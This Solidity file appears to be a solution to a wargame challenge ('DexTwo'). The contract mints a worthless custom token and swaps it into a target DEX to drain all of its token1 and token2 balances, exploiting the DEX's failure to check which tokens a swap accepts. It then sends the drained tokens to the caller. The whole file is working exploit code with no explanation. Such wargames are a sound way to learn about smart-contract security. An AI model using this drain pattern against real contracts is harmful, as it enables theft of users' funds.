// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

interface IDexTwo {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function swap(address from, address to, uint256 amount) external;
}

contract CustomToken is ERC20 {
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {
        _mint(msg.sender, 4);
    }
}

contract DexTwo {
    IDexTwo dexInstance;
    CustomToken public token;
    address public token1;
    address public token2;

    constructor(address _instanceAddress) {
        dexInstance = IDexTwo(_instanceAddress);
        token = new CustomToken("CustomToken", "CT");
        token1 = dexInstance.token1();
        token2 = dexInstance.token2();
    }

    function drain() public {
        token.approve(address(dexInstance), 3);
        token.transfer(address(dexInstance), 1);
        dexInstance.swap(address(token), token1, 1);
        dexInstance.swap(address(token), token2, 2);
        require(
            IERC20(token1).balanceOf(address(dexInstance)) == 0 && IERC20(token2).balanceOf(address(dexInstance)) == 0,
            "Not drained"
        );
        IERC20(token1).transfer(msg.sender, IERC20(token1).balanceOf(address(this)));
        IERC20(token2).transfer(msg.sender, IERC20(token2).balanceOf(address(this)));
    }
}
